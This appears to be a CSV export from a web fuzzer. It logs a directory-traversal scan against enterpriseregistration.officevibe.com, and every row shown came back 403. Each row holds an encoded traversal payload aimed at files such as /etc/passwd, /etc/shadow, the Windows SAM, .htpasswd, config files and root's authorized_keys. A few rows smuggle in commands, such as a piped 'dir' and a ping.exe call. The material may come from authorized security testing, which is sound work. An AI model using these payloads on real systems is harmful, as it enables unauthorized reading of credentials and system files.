FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5c..%5cetc/passwd,https://enterpriseregistration.officevibe.com/..%5c..%5cetc/passwd,,93430,403,312,17,7,text/html; charset=us-ascii,27.766228ms,
../../../../apache/logs/error.log,https://enterpriseregistration.officevibe.com/../../../../apache/logs/error.log,,93634,403,312,17,7,text/html; charset=us-ascii,27.590597ms,
..////etc/passwd,https://enterpriseregistration.officevibe.com/..////etc/passwd,,94975,403,312,17,7,text/html; charset=us-ascii,28.288934ms,
../../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/../../../../../../../../../../WINNT/system32/ipconfig.exe,,95676,403,312,17,7,text/html; charset=us-ascii,31.370304ms,
.//..///etc/passwd,https://enterpriseregistration.officevibe.com/.//..///etc/passwd,,96809,403,312,17,7,text/html; charset=us-ascii,37.799373ms,
../../../.htaccess,https://enterpriseregistration.officevibe.com/../../../.htaccess,,98837,403,312,17,7,text/html; charset=us-ascii,27.682327ms,
cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,https://enterpriseregistration.officevibe.com/cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1,,99167,403,312,17,7,text/html; charset=us-ascii,27.963758ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,https://enterpriseregistration.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd,,99682,403,312,17,7,text/html; charset=us-ascii,28.603496ms,
../html,https://enterpriseregistration.officevibe.com/../html,,100072,403,312,17,7,text/html; charset=us-ascii,27.862479ms,
../config.php,https://enterpriseregistration.officevibe.com/../config.php,,102518,403,312,17,7,text/html; charset=us-ascii,27.952683ms,
jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,https://enterpriseregistration.officevibe.com/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd,,104832,403,312,17,7,text/html; charset=us-ascii,27.778584ms,
res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://enterpriseregistration.officevibe.com/res/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,107746,403,312,17,7,text/html; charset=us-ascii,28.24729ms,
../users.db.php,https://enterpriseregistration.officevibe.com/../users.db.php,,108705,403,312,17,7,text/html; charset=us-ascii,27.717222ms,
../apache/logs/error.log,https://enterpriseregistration.officevibe.com/../apache/logs/error.log,,108758,403,312,17,7,text/html; charset=us-ascii,28.404908ms,
my_keys&dst=../../../root/.ssh/authorized_keys,https://enterpriseregistration.officevibe.com/my_keys&dst=../../../root/.ssh/authorized_keys,,109041,403,312,17,7,text/html; charset=us-ascii,28.003162ms,
signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,https://enterpriseregistration.officevibe.com/signEzUI/playlist/edit/upload/../../../../../../../../../../etc/passwd,,111191,403,312,17,7,text/html; charset=us-ascii,27.543529ms,
ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,https://enterpriseregistration.officevibe.com/ca/..\\..\\..\\..\\..\\..\\..\\..\\winnt/\\win.ini,,112444,403,312,17,7,text/html; charset=us-ascii,28.206551ms,
votes/../../admin/multiuser/multiuser.php,https://enterpriseregistration.officevibe.com/votes/../../admin/multiuser/multiuser.php,,112576,403,312,17,7,text/html; charset=us-ascii,33.143543ms,
ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,https://enterpriseregistration.officevibe.com/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd,,114224,403,312,17,7,text/html; charset=us-ascii,27.662613ms,
../../proc,https://enterpriseregistration.officevibe.com/../../proc,,125026,403,312,17,7,text/html; charset=us-ascii,28.07368ms,
[SecCheck]/..%2f../ext.ini,https://enterpriseregistration.officevibe.com/[SecCheck]/..%2f../ext.ini,,127572,403,312,17,7,text/html; charset=us-ascii,28.030578ms,
admin/../../../file/to/view,https://enterpriseregistration.officevibe.com/admin/../../../file/to/view,,128723,403,312,17,7,text/html; charset=us-ascii,28.112942ms,
../../../../etc/passwd,https://enterpriseregistration.officevibe.com/../../../../etc/passwd,,130010,403,312,17,7,text/html; charset=us-ascii,36.684039ms,
"tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,","https://enterpriseregistration.officevibe.com/tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,",,134096,403,312,17,7,text/html; charset=us-ascii,28.026155ms,
../../../../../etc/passwd,https://enterpriseregistration.officevibe.com/../../../../../etc/passwd,,134649,403,312,17,7,text/html; charset=us-ascii,28.053878ms,
../../var/www/logs/access_log,https://enterpriseregistration.officevibe.com/../../var/www/logs/access_log,,136450,403,312,17,7,text/html; charset=us-ascii,28.472509ms,
NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,https://enterpriseregistration.officevibe.com/NUL/../../../../../../../../../WINNT/system32/ipconfig.exe,,137428,403,312,17,7,text/html; charset=us-ascii,28.020961ms,
../../../../pswd,https://enterpriseregistration.officevibe.com/../../../../pswd,,139151,403,312,17,7,text/html; charset=us-ascii,28.211312ms,
../../..//etc/passwd,https://enterpriseregistration.officevibe.com/../../..//etc/passwd,,145383,403,312,17,7,text/html; charset=us-ascii,27.914049ms,
../../../../../../../../../../etc/passwd,https://enterpriseregistration.officevibe.com/../../../../../../../../../../etc/passwd,,149904,403,312,17,7,text/html; charset=us-ascii,28.51964ms,
\..\..\..\..\..\..\..\..\..\etc\passwd,https://enterpriseregistration.officevibe.com/\..\..\..\..\..\..\..\..\..\etc\passwd,,149962,403,312,17,7,text/html; charset=us-ascii,27.975751ms,
..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,https://enterpriseregistration.officevibe.com/..%2F..%2F..%2F..%2F..%2F../winnt/repair/sam._,,150077,403,312,17,7,text/html; charset=us-ascii,28.150065ms,
../logs/error.log,https://enterpriseregistration.officevibe.com/../logs/error.log,,150787,403,312,17,7,text/html; charset=us-ascii,27.739126ms,
%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,https://enterpriseregistration.officevibe.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini,,150783,403,312,17,7,text/html; charset=us-ascii,31.484492ms,
../_config.php,https://enterpriseregistration.officevibe.com/../_config.php,,152532,403,312,17,7,text/html; charset=us-ascii,27.761997ms,
%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,https://enterpriseregistration.officevibe.com/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini,,152732,403,312,17,7,text/html; charset=us-ascii,27.881463ms,
../../../../winnt/repair/sam._,https://enterpriseregistration.officevibe.com/../../../../winnt/repair/sam._,,152901,403,312,17,7,text/html; charset=us-ascii,33.139326ms,
//./../.../boot.ini,https://enterpriseregistration.officevibe.com///./../.../boot.ini,,154859,403,312,17,7,text/html; charset=us-ascii,28.221105ms,
../.htaccess,https://enterpriseregistration.officevibe.com/../.htaccess,,154866,403,312,17,7,text/html; charset=us-ascii,28.407201ms,
a\..\..\muster.db,https://enterpriseregistration.officevibe.com/a\..\..\muster.db,,155201,403,312,17,7,text/html; charset=us-ascii,28.028604ms,
./../../../../../../../../../../etc/passwd,https://enterpriseregistration.officevibe.com/./../../../../../../../../../../etc/passwd,,158810,403,312,17,7,text/html; charset=us-ascii,27.752934ms,
../etc/passwd,https://enterpriseregistration.officevibe.com/../etc/passwd,,161332,403,312,17,7,text/html; charset=us-ascii,27.480358ms,
../../../apache/logs/access.log,https://enterpriseregistration.officevibe.com/../../../apache/logs/access.log,,165596,403,312,17,7,text/html; charset=us-ascii,35.574734ms,
RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,https://enterpriseregistration.officevibe.com/RASHTML5Gateway//..\\\..\\\..\\\..\\\..\\\windows\win.ini,,168885,403,312,17,7,text/html; charset=us-ascii,28.002565ms,
./../../../../../../../../../../etc/shadow,https://enterpriseregistration.officevibe.com/./../../../../../../../../../../etc/shadow,,170300,403,312,17,7,text/html; charset=us-ascii,28.223394ms,
../config.dat,https://enterpriseregistration.officevibe.com/../config.dat,,175059,403,312,17,7,text/html; charset=us-ascii,33.660511ms,
../apache/logs/access.log,https://enterpriseregistration.officevibe.com/../apache/logs/access.log,,175197,403,312,17,7,text/html; charset=us-ascii,38.269196ms,
../www,https://enterpriseregistration.officevibe.com/../www,,175254,403,312,17,7,text/html; charset=us-ascii,27.447114ms,
../config.asp,https://enterpriseregistration.officevibe.com/../config.asp,,179031,403,312,17,7,text/html; charset=us-ascii,28.08829ms,
./.././..//etc/passwd,https://enterpriseregistration.officevibe.com/./.././..//etc/passwd,,181131,403,312,17,7,text/html; charset=us-ascii,27.621491ms,
..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,https://enterpriseregistration.officevibe.com/..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cboot.ini,,183471,403,312,17,7,text/html; charset=us-ascii,28.207497ms,
error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,https://enterpriseregistration.officevibe.com/error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini,,186200,403,312,17,7,text/html; charset=us-ascii,27.777635ms,
../.htpasswd,https://enterpriseregistration.officevibe.com/../.htpasswd,,186603,403,312,17,7,text/html; charset=us-ascii,28.310629ms,
lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,https://enterpriseregistration.officevibe.com/lib/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd,,188596,403,312,17,7,text/html; charset=us-ascii,27.774503ms,
../..//etc/passwd,https://enterpriseregistration.officevibe.com/../..//etc/passwd,,193029,403,312,17,7,text/html; charset=us-ascii,27.766581ms,
static/../../../../windows/win.ini,https://enterpriseregistration.officevibe.com/static/../../../../windows/win.ini,,201012,403,312,17,7,text/html; charset=us-ascii,28.35604ms,
%2e%2e//google.com,https://enterpriseregistration.officevibe.com/%2e%2e//google.com,,202957,403,312,17,7,text/html; charset=us-ascii,28.042751ms,
../../../..//etc/passwd;index.html,https://enterpriseregistration.officevibe.com/../../../..//etc/passwd;index.html,,203432,403,312,17,7,text/html; charset=us-ascii,28.09823ms,
